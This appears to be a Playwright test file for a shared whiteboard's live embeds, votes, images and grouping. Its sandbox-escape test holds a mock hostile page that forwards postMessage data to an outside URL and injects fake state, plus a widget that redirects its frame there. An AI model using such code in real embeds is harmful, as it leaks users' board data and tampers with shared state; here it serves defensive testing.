// Canvas inputs on the dark board, with two people where it matters: sealed live embeds (a poll vote and a
// timer start reach the other person live), face-sticker votes, image crop and link, and lock / group from the
// context menu and properties panel.
import zlib from 'node:zlib';
import type { Browser, Page } from '@playwright/test';
import { test, expect, newPerson, newGuest, type Person } from './lib/fixtures';

test.beforeEach(async ({ request }) => {
  const { mode } = await (await request.get('/api/auth/user')).json();
  const solo = /sealed|calculator/.test(test.info().titlePath.join(' '));
  test.skip(!solo && mode !== 'team', 'Needs a server in team mode (TEAM_MODE=1).');
});
import { createBoard, getBoard, setLinkAccess } from './lib/api';
import { canvasPoint, centerOf, drag, drawShape, focusCanvas, openBoard, sceneOf, scrollToElements, snap, topEdgeOf, waitForElement } from './lib/board';
import { LIVE_TIMEOUT } from './lib/env';

/** Two people on one board: Ada owns it, Ben joins through the edit link as a guest. */
async function twoPeople(browser: Browser, title: string) {
  const ada = await newPerson(browser, 'Ada', 'inputs');
  const ben = await newGuest(browser, 'Ben');
  const board = await createBoard(ada.request, title);
  const token = await setLinkAccess(ada.request, board.id, 'edit');
  await openBoard(ada.page, `/b/${board.id}`);
  await openBoard(ben.page, `/s/${token}`);
  await focusCanvas(ada.page);
  await focusCanvas(ben.page);
  return { ada, ben, board };
}

async function closeAll(...people: Person[]) {
  await Promise.all(people.map((p) => p.context.close()));
}

/** Any element fields (including ones the shared scene reader leaves out, like locked/crop/link). */
async function propsOf(page: Page, id: string): Promise<Record<string, any> | null> {
  return page.evaluate((id) => {
    const app = window.__monetE2E?.app();
    const e = app?.getSceneElementsIncludingDeleted().find((x: any) => x.id === id);
    return e ? JSON.parse(JSON.stringify(e)) : null;
  }, id);
}

async function insertLiveEmbed(page: Page, kind: 'poll' | 'timer' | 'calculator' | 'prototype', fill: (page: Page) => Promise<void>) {
  await page.getByTestId('button-embed-open').click();
  await page.getByTestId('tab-embed-live').click();
  await page.getByTestId(`button-live-kind-${kind}`).click();
  await fill(page);
  await page.getByTestId('button-embed-insert-live').click();
  return waitForElement(page, (e) => e.type === 'embeddable' && (e.customData as any)?.embedKind === kind, { message: `${kind} embed inserted` });
}

/** Replaces an element's link and customData in one page's scene (it syncs like any local edit). */
async function rewriteElement(page: Page, id: string, patch: { link: string; customData: Record<string, unknown> }) {
  await page.evaluate(
    ({ id, patch }) => {
      const app = window.__monetE2E?.app();
      const els = app
        .getSceneElementsIncludingDeleted()
        .map((e: any) =>
          e.id === id ? { ...e, ...patch, version: e.version + 1, versionNonce: Math.floor(Math.random() * 2 ** 31), updated: Date.now() } : e,
        );
      app.updateScene({ elements: els });
    },
    { id, patch },
  );
}

/** A full HTML document like the board AI writes for a custom widget: a shared counter. */
const AI_COUNTER_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>Counter</title>
<style>body{display:grid;place-items:center;height:100vh;margin:0}button{font-size:18px;padding:8px 16px}</style></head>
<body><button id="b" data-testid="ai-counter">Count: 0</button>
<script>var b=document.getElementById('b');monet.onState(function(s){b.textContent='Count: '+(s.n||0)});
b.onclick=function(){monet.setState({n:(monet.getState().n||0)+1})};</script></body></html>`;

/** Clicks the middle of an embed (Excalidraw makes it interactive) and returns its sealed frame. */
async function activate(page: Page, id: string) {
  await scrollToElements(page, [id]);
  const el = (await sceneOf(page)).find((e) => e.id === id)!;
  await page.locator(`iframe[data-element-id="${id}"]`).waitFor({ timeout: LIVE_TIMEOUT });
  const c = await centerOf(page, el);
  await page.mouse.click(c.x, c.y);
  await page.waitForTimeout(300);
  return page.frameLocator(`iframe[data-element-id="${id}"]`);
}

/** A small solid-color PNG (two color bands) for upload tests. */
function pngBuffer(width = 320, height = 200) {
  const raw = Buffer.alloc((width * 3 + 1) * height);
  for (let y = 0; y < height; y++) {
    const row = y * (width * 3 + 1);
    for (let x = 0; x < width; x++) {
      const o = row + 1 + x * 3;
      const left = x < width / 2;
      raw[o] = left ? 0x5b : 0xf5;
      raw[o + 1] = left ? 0x9c : 0xd9;
      raw[o + 2] = left ? 0xf0 : 0x0a;
    }
  }
  const crc = (buf: Buffer) => {
    let c = ~0;
    for (const b of buf) {
      c ^= b;
      for (let k = 0; k < 8; k++) c = c & 1 ? (c >>> 1) ^ 0xedb88320 : c >>> 1;
    }
    return ~c >>> 0;
  };
  const chunk = (type: string, data: Buffer) => {
    const t = Buffer.from(type);
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length);
    const c = Buffer.alloc(4);
    c.writeUInt32BE(crc(Buffer.concat([t, data])));
    return Buffer.concat([len, t, data, c]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  return Buffer.concat([
    Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]),
    chunk('IHDR', ihdr),
    chunk('IDAT', zlib.deflateSync(raw)),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

test.describe('live embeds (sealed, shared state)', () => {
  test('a poll vote reaches the other person live', async ({ browser }, testInfo) => {
    const { ada, ben, board } = await twoPeople(browser, 'Poll');
    const poll = await insertLiveEmbed(ada.page, 'poll', async (p) => {
      await p.getByTestId('input-poll-question').fill('Which launch date?');
      await p.getByTestId('input-poll-options').fill('March 3\nMarch 10\nMarch 17');
    });
    expect((poll.customData as any).kind).toBe('live-embed');
    await waitForElement(ben.page, (e) => e.id === poll.id, { message: 'poll reaches Ben' });

    // The frame is sealed: scripts only, no same-origin access.
    const sandbox = await ben.page.locator(`iframe[data-element-id="${poll.id}"]`).getAttribute('sandbox');
    expect(sandbox).toBe('allow-scripts');

    const benFrame = await activate(ben.page, poll.id);
    await expect(benFrame.getByTestId('poll-option-1')).toContainText('March 10');
    await benFrame.getByTestId('poll-option-1').click();

    await expect
      .poll(async () => ((await propsOf(ada.page, poll.id))?.customData?.state?.votes ?? {})[ben.user.id], {
        timeout: LIVE_TIMEOUT,
        message: "Ben's vote in Ada's scene",
      })
      .toBe(1);
    const adaFrame = await activate(ada.page, poll.id);
    await expect(adaFrame.getByTestId('poll-count-1')).toHaveText('1', { timeout: LIVE_TIMEOUT });

    // Ada votes too; Ben's frame shows both votes.
    await adaFrame.getByTestId('poll-option-0').click();
    await expect(benFrame.getByTestId('poll-count-0')).toHaveText('1', { timeout: LIVE_TIMEOUT });
    await expect(benFrame.getByTestId('poll-count-1')).toHaveText('1');

    // Saved on the server too.
    await expect
      .poll(async () => {
        const el = (await getBoard(ada.request, board.id)).elements.find((e) => e.id === poll.id) as any;
        return Object.keys(el?.customData?.state?.votes ?? {}).length;
      })
      .toBe(2);
    await snap(ben.page, testInfo, 'poll-two-votes');
    await closeAll(ada, ben);
  });

  test('starting a timer starts it for everyone', async ({ browser }, testInfo) => {
    const { ada, ben } = await twoPeople(browser, 'Timer');
    const timer = await insertLiveEmbed(ada.page, 'timer', async (p) => {
      await p.getByTestId('input-timer-minutes').fill('3');
      await p.getByTestId('input-timer-label').fill('Brainstorm');
    });
    await waitForElement(ben.page, (e) => e.id === timer.id, { message: 'timer reaches Ben' });
    const adaFrame = await activate(ada.page, timer.id);
    await expect(adaFrame.getByTestId('timer-display')).toHaveText('03:00');

    const benFrame = await activate(ben.page, timer.id);
    await benFrame.getByTestId('timer-start').click();

    await expect.poll(async () => typeof (await propsOf(ada.page, timer.id))?.customData?.state?.startedAt, { timeout: LIVE_TIMEOUT }).toBe('number');
    await expect(adaFrame.getByTestId('timer-start')).toHaveText('Pause', { timeout: LIVE_TIMEOUT });
    await expect(adaFrame.getByTestId('timer-display')).not.toHaveText('03:00', { timeout: 4_000 });
    await snap(ada.page, testInfo, 'timer-running-for-ada');

    // Pausing from Ada's side stops it for Ben.
    await adaFrame.getByTestId('timer-start').click();
    await expect(benFrame.getByTestId('timer-start')).toHaveText('Resume', { timeout: LIVE_TIMEOUT });
    const paused = await benFrame.getByTestId('timer-display').innerText();
    await ben.page.waitForTimeout(1_500);
    await expect(benFrame.getByTestId('timer-display'), 'a paused timer stays put').toHaveText(paused);
    await expect(adaFrame.getByTestId('timer-display')).toHaveText(paused);

    // Reset from Ben's side puts it back to 03:00 for Ada.
    await benFrame.getByTestId('timer-reset').click();
    await expect(adaFrame.getByTestId('timer-display')).toHaveText('03:00', { timeout: LIVE_TIMEOUT });
    await expect(adaFrame.getByTestId('timer-start')).toHaveText('Start');
    await closeAll(ada, ben);
  });
});

test.describe('live embeds written by the board AI', () => {
  test('a timer and a custom widget in the AI element format render and share state', async ({ browser }) => {
    const { ada, ben } = await twoPeople(browser, 'AI embeds');
    // Exactly what add_live_embed writes: html "" for built-in kinds, config.minutes for the timer.
    const timer = await insertLiveEmbed(ada.page, 'timer', async (p) => {
      await p.getByTestId('input-timer-minutes').fill('5');
    });
    await rewriteElement(ada.page, timer.id, {
      link: 'https://embed.monet.local/timer',
      customData: {
        kind: 'live-embed',
        embedKind: 'timer',
        title: 'Timer',
        html: '',
        state: {},
        config: { minutes: 2 },
        createdBy: 'ai',
        aiRun: 'e2e',
        ref: 'timer-1',
      },
    });
    await waitForElement(ben.page, (e) => e.id === timer.id && (e.customData as any)?.createdBy === 'ai', { message: 'AI timer reaches Ben' });
    const benTimer = await activate(ben.page, timer.id);
    await expect(benTimer.getByTestId('timer-display')).toHaveText('02:00', { timeout: LIVE_TIMEOUT });

    // A custom widget: one self-contained document using window.monet for shared state.
    const widget = await insertLiveEmbed(ada.page, 'prototype', async (p) => {
      await p.getByTestId('input-prototype-html').fill('<p>placeholder</p>');
    });
    await rewriteElement(ada.page, widget.id, {
      link: 'https://embed.monet.local/custom',
      customData: {
        kind: 'live-embed',
        embedKind: 'custom',
        title: 'Widget',
        html: AI_COUNTER_HTML,
        state: {},
        config: {},
        createdBy: 'ai',
        aiRun: 'e2e',
        ref: 'widget-1',
      },
    });
    await waitForElement(ben.page, (e) => e.id === widget.id && (e.customData as any)?.embedKind === 'custom', { message: 'AI widget reaches Ben' });
    const benWidget = await activate(ben.page, widget.id);
    await expect(benWidget.getByTestId('ai-counter')).toHaveText('Count: 0', { timeout: LIVE_TIMEOUT });
    const adaWidget = await activate(ada.page, widget.id);
    await adaWidget.getByTestId('ai-counter').click();
    await adaWidget.getByTestId('ai-counter').click();
    await expect(benWidget.getByTestId('ai-counter')).toHaveText('Count: 2', { timeout: LIVE_TIMEOUT });
    await closeAll(ada, ben);
  });
});

test.describe('face-sticker votes', () => {
  test('two people vote on an item, see the count, and one takes it back', async ({ browser }, testInfo) => {
    const { ada, ben } = await twoPeople(browser, 'Votes');
    const a = await canvasPoint(ada.page, 0.3, 0.35);
    const b = await canvasPoint(ada.page, 0.45, 0.55);
    const rect = await drawShape(ada.page, 'r', a, b);
    // The new shape is selected; U votes with Ada's face sticker.
    await ada.page.keyboard.press('u');
    const isVote = (userId: string) => (e: { type: string; customData?: Record<string, unknown> }) =>
      e.type === 'ellipse' && e.customData?.kind === 'vote' && e.customData?.targetId === rect.id && e.customData?.userId === userId;
    await waitForElement(ada.page, isVote(ada.user.id), { message: "Ada's vote sticker" });
    await waitForElement(ben.page, isVote(ada.user.id), { message: "Ada's vote reaches Ben" });

    // Ben selects the item and uses the Vote button.
    await scrollToElements(ben.page, [rect.id]);
    const benRect = (await sceneOf(ben.page)).find((e) => e.id === rect.id)!;
    const edge = await topEdgeOf(ben.page, { ...benRect, x: benRect.x - benRect.width / 4 });
    await ben.page.mouse.click(edge.x, edge.y + 2);
    await expect(ben.page.getByTestId('button-vote-selection')).toBeVisible();
    await ben.page.getByTestId('button-vote-selection').click();
    await waitForElement(ada.page, isVote(ben.user.id), { message: "Ben's vote reaches Ada" });
    await expect(ada.page.getByTestId(`vote-badge-${rect.id}`)).toContainText('2');
    await expect(ben.page.getByTestId(`vote-badge-${rect.id}`)).toContainText('2');
    const sticker = (await sceneOf(ada.page)).find(isVote(ada.user.id))!;
    expect((await propsOf(ada.page, sticker.id))?.locked, 'vote stickers are locked so they are not dragged by accident').toBe(true);
    await snap(ada.page, testInfo, 'two-face-stickers');

    // Moving the item moves its stickers.
    await focusCanvas(ada.page);
    const adaRect = (await sceneOf(ada.page)).find((e) => e.id === rect.id)!;
    const from = await topEdgeOf(ada.page, { ...adaRect, x: adaRect.x - adaRect.width / 4 });
    await drag(ada.page, { x: from.x, y: from.y + 1 }, { x: from.x + 120, y: from.y + 81 });
    await expect
      .poll(
        async () => {
          const els = await sceneOf(ben.page);
          const r = els.find((e) => e.id === rect.id)!;
          const s = els.find(isVote(ada.user.id))!;
          return Math.abs(s.y - (r.y - 13)) < 2 && s.x > r.x && s.x < r.x + r.width;
        },
        { timeout: LIVE_TIMEOUT, message: 'stickers follow the moved item (as Ben sees it)' },
      )
      .toBe(true);

    // Ada takes her vote back (item still selected after the drag).
    await ada.page.keyboard.press('u');
    await expect.poll(async () => (await sceneOf(ben.page)).some(isVote(ada.user.id)), { timeout: LIVE_TIMEOUT }).toBe(false);
    await expect(ben.page.getByTestId(`vote-badge-${rect.id}`)).toContainText('1');
    await closeAll(ada, ben);
  });
});

test.describe('images on the dark board', () => {
  test('upload, crop and link an image; the other person sees the crop and link', async ({ browser }, testInfo) => {
    const { ada, ben } = await twoPeople(browser, 'Image');
    await ada.page.getByTestId('input-add-file').setInputFiles({ name: 'bands.png', mimeType: 'image/png', buffer: pngBuffer() });
    const img = await waitForElement(ada.page, (e) => e.type === 'image', { message: 'image inserted' });
    await waitForElement(ben.page, (e) => e.id === img.id, { message: 'image reaches Ben' });
    await expect
      .poll(
        async () =>
          ben.page.evaluate((id) => {
            const app = window.__monetE2E?.app();
            const el = app.getSceneElements().find((e: any) => e.id === id);
            return !!(el && app.files?.[el.fileId]?.dataURL);
          }, img.id),
        { timeout: 10_000, message: 'Ben has the image file' },
      )
      .toBe(true);

    // Crop: double-click the image, drag the bottom-right handle inward, Enter.
    await focusCanvas(ada.page);
    const el = (await sceneOf(ada.page)).find((e) => e.id === img.id)!;
    const c = await centerOf(ada.page, el);
    await ada.page.mouse.dblclick(c.x, c.y);
    await expect.poll(async () => ada.page.evaluate(() => window.__monetE2E?.app().state.croppingElementId)).toBe(img.id);
    const br = await ada.page.evaluate((id) => {
      const app = window.__monetE2E?.app();
      const e = app.getSceneElements().find((x: any) => x.id === id);
      const s = app.state;
      return { x: (e.x + e.width + s.scrollX) * s.zoom.value + s.offsetLeft, y: (e.y + e.height + s.scrollY) * s.zoom.value + s.offsetTop };
    }, img.id);
    // Start exactly on the corner handle (a point inside the image pans the picture instead).
    await drag(ada.page, { x: br.x, y: br.y }, { x: br.x - 90, y: br.y - 50 }, 10);
    await ada.page.keyboard.press('Enter');
    await expect.poll(async () => (await propsOf(ada.page, img.id))?.crop ?? null, { message: 'crop on Ada' }).not.toBeNull();
    const crop = (await propsOf(ada.page, img.id))!.crop;
    await expect
      .poll(async () => JSON.stringify((await propsOf(ben.page, img.id))?.crop ?? null), { timeout: LIVE_TIMEOUT, message: 'crop reaches Ben' })
      .toBe(JSON.stringify(crop));

    // Link: select the image, Ctrl+K, type a URL, Enter.
    await focusCanvas(ada.page);
    const cropped = (await sceneOf(ada.page)).find((e) => e.id === img.id)!;
    const cc = await centerOf(ada.page, cropped);
    await ada.page.mouse.click(cc.x, cc.y);
    await ada.page.keyboard.press('Control+k');
    const input = ada.page.locator('.excalidraw-hyperlinkContainer input');
    await input.waitFor();
    await snap(ada.page, testInfo, 'image-link-editor');
    await input.fill('https://example.com/launch-plan');
    await input.press('Enter');
    await expect
      .poll(async () => (await propsOf(ben.page, img.id))?.link, { timeout: LIVE_TIMEOUT, message: 'link reaches Ben' })
      .toBe('https://example.com/launch-plan');
    await snap(ben.page, testInfo, 'cropped-linked-image-for-ben');
    await closeAll(ada, ben);
  });
});

test.describe('lock and group', () => {
  test('group from the context menu, lock from the properties panel, unlock from the context menu; all live', async ({ browser }, testInfo) => {
    const { ada, ben } = await twoPeople(browser, 'Arrange');
    const r1 = await drawShape(ada.page, 'r', await canvasPoint(ada.page, 0.25, 0.3), await canvasPoint(ada.page, 0.35, 0.45));
    const r2 = await drawShape(ada.page, 'r', await canvasPoint(ada.page, 0.45, 0.3), await canvasPoint(ada.page, 0.55, 0.45));
    // Select both with a selection box.
    await ada.page.keyboard.press('v');
    await drag(ada.page, await canvasPoint(ada.page, 0.2, 0.22), await canvasPoint(ada.page, 0.6, 0.52));
    await expect.poll(async () => await ada.page.evaluate(() => Object.keys(window.__monetE2E?.app().state.selectedElementIds ?? {}).length)).toBe(2);

    // Group selection from the context menu.
    const e1 = await topEdgeOf(ada.page, r1);
    await ada.page.mouse.click(e1.x, e1.y, { button: 'right' });
    await ada.page.locator('.context-menu').getByText('Group selection', { exact: true }).click();
    await expect
      .poll(
        async () => {
          const els = await sceneOf(ben.page);
          const g1 = els.find((e) => e.id === r1.id)?.groupIds ?? [];
          const g2 = els.find((e) => e.id === r2.id)?.groupIds ?? [];
          return g1.length > 0 && g1[0] === g2[0];
        },
        { timeout: LIVE_TIMEOUT, message: 'group reaches Ben' },
      )
      .toBe(true);

    // Lock from the properties panel (the group is still selected).
    const lockBtn = ada.page.getByTestId('button-panel-lock');
    await expect(lockBtn).toBeVisible();
    await snap(ada.page, testInfo, 'properties-panel-lock');
    await lockBtn.click();
    await expect
      .poll(async () => [(await propsOf(ben.page, r1.id))?.locked, (await propsOf(ben.page, r2.id))?.locked].join(), {
        timeout: LIVE_TIMEOUT,
        message: 'lock reaches Ben',
      })
      .toBe('true,true');

    // Right-click a locked item: the context menu offers Excalidraw's unlock toggle (Ctrl+Shift+L). For a group it
    // reads "Unlock all" (all selected items); the board-wide "unlock everything" has no shortcut.
    await ada.page.mouse.click(e1.x, e1.y, { button: 'right' });
    const menu = ada.page.locator('.context-menu');
    await menu.waitFor();
    const items = await menu.locator('li').allInnerTexts();
    const unlock = items.find((t) => /^Unlock( all)?\n/.test(t) && t.includes('Ctrl+Shift+L'));
    expect(unlock, `context menu on a locked item: ${items.map((t) => t.replace('\n', ' ')).join(' | ')}`).toBeTruthy();
    await menu.locator('li').filter({ hasText: 'Ctrl+Shift+L' }).click();
    await expect
      .poll(async () => [(await propsOf(ben.page, r1.id))?.locked, (await propsOf(ben.page, r2.id))?.locked].join(), {
        timeout: LIVE_TIMEOUT,
        message: 'unlock reaches Ben',
      })
      .toBe('false,false');

    // Ungroup from the properties panel.
    await focusCanvas(ada.page);
    await ada.page.mouse.click(e1.x, e1.y);
    await ada.page.locator('.App-menu__left [title^="Ungroup"]').first().click();
    await expect
      .poll(async () => ((await sceneOf(ben.page)).find((e) => e.id === r1.id)?.groupIds ?? ['x']).length, {
        timeout: LIVE_TIMEOUT,
        message: 'ungroup reaches Ben',
      })
      .toBe(0);
    await closeAll(ada, ben);
  });
});

test.describe('live embeds stay sealed', () => {
  test('a widget that navigates its frame away gets no more board state, and its messages are ignored', async ({ browser }, testInfo) => {
    const ada = await newPerson(browser, 'Ada', 'sealed');
    const hits: string[] = [];
    // Stands in for an outside site the widget sends its frame to. It records every message it receives and tries
    // to restart the handshake and write shared state the way the runner would.
    await ada.context.route('https://example.com/**', (route) => {
      const u = new URL(route.request().url());
      hits.push(u.pathname + (u.searchParams.get('d') ? ` ${u.searchParams.get('d')}` : ''));
      if (u.pathname === '/evil') {
        return route.fulfill({
          contentType: 'text/html',
          body: `<!doctype html><script>
addEventListener('message', function (e) { fetch('https://example.com/got?d=' + encodeURIComponent(JSON.stringify(e.data).slice(0, 300))); });
function poke() { parent.postMessage({ monet: 'loader-ready' }, '*'); parent.postMessage({ monet: 'ready' }, '*'); parent.postMessage({ monet: 'setState', patch: { hacked: true } }, '*'); }
poke(); setInterval(poke, 400);
</script>`,
        });
      }
      return route.fulfill({ body: 'ok' });
    });
    const board = await createBoard(ada.request, 'Sealed embeds');
    await openBoard(ada.page, `/b/${board.id}`);
    await focusCanvas(ada.page);
    const widget = await insertLiveEmbed(ada.page, 'prototype', async (p) => {
      await p
        .getByTestId('input-prototype-html')
        .fill(
          `<p>Leaving</p><script>monet.onState(function () { if (window.__left) return; window.__left = 1; setTimeout(function () { location.href = 'https://example.com/evil'; }, 300); });</script>`,
        );
    });
    await activate(ada.page, widget.id);
    // The widget got its state from the board (onState ran), then tries to leave. The production page's CSP (frame-src)
    // blocks the navigation; under the Vite dev server (no page CSP) it goes through. Either way, nothing may leak.
    await ada.page.waitForTimeout(2000);
    test.info().annotations.push({
      type: 'note',
      description: hits.includes('/evil') ? 'navigation went through (no page CSP); checking nothing leaks' : 'navigation blocked by the page CSP',
    });

    // Shared state keeps changing on the board; none of it, and nothing about who's viewing, may reach the outside page.
    const cd = (await propsOf(ada.page, widget.id))!.customData;
    await rewriteElement(ada.page, widget.id, { link: 'https://embed.monet.local/prototype', customData: { ...cd, state: { round: 1 } } });
    await ada.page.waitForTimeout(800);
    await rewriteElement(ada.page, widget.id, { link: 'https://embed.monet.local/prototype', customData: { ...cd, state: { round: 2 } } });
    await ada.page.waitForTimeout(2500);
    expect(
      hits.filter((h) => h.startsWith('/got')),
      'messages delivered to the navigated frame',
    ).toEqual([]);
    const state = (await propsOf(ada.page, widget.id))?.customData?.state ?? {};
    expect(state.hacked, 'setState from the outside page is ignored').toBeUndefined();
    expect(state.round).toBe(2);
    await snap(ada.page, testInfo, 'sealed-after-escape');
    await ada.context.close();
  });

  test('a calculator still works and shares its display', async ({ browser }) => {
    const { ada, ben } = await twoPeople(browser, 'Calculator');
    const calc = await insertLiveEmbed(ada.page, 'calculator', async () => undefined);
    await waitForElement(ben.page, (e) => e.id === calc.id, { message: 'calculator reaches Ben' });
    const adaCalc = await activate(ada.page, calc.id);
    for (const key of ['7', '+', '2', '=']) await adaCalc.getByRole('button', { name: key, exact: true }).click();
    await expect(adaCalc.getByTestId('calc-display')).toHaveText('9');
    const benCalc = await activate(ben.page, calc.id);
    await expect(benCalc.getByTestId('calc-display')).toHaveText('9', { timeout: LIVE_TIMEOUT });
    await closeAll(ada, ben);
  });
});
